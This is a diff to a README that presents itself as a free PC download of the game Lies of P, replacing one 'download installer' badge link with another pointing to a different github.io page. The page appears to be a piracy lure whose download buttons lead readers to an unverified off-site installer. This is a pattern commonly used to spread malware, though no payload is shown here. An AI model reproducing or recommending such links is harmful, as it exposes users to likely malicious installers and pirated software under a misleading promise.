@@ -1,6 +1,7 @@
 # Lies of P — Free Download 
 
-[![🎭 DOWNLOAD INSTALLER: Lies of P](https://img.shields.io/badge/🎭%20DOWNLOAD%20INSTALLER:%20Lies%20of%20P-darkred?style=for-the-badge&logo=ghost&logoColor=white)](https://Lies-Of-P-PC-Download.github.io/.github)
+[![GET Lies Of](https://img.shields.io/badge/GET%20%E2%80%94%20Lies-Of-0078D6?style=for-the-badge&logoColor=white)](https://mbrunel103255.github.io/.github/Lies-Of)
+
 
 ## 🕰 About the Game
 
@@ -24,7 +25,8 @@ Now you can **download Lies of P for PC** and immerse yourself in this gripping 
 
 ## 🕹 Download Installer
 
-[![🎭 DOWNLOAD INSTALLER: Lies of P](https://img.shields.io/badge/🎭%20DOWNLOAD%20INSTALLER:%20Lies%20of%20P-darkred?style=for-the-badge&logo=ghost&logoColor=white)](https://Lies-Of-P-PC-Download.github.io/.github)
+[![GET Lies Of](https://img.shields.io/badge/GET%20%E2%80%94%20Lies-Of-0078D6?style=for-the-badge&logoColor=white)](https://mbrunel103255.github.io/.github/Lies-Of)
+
 
 ---
 
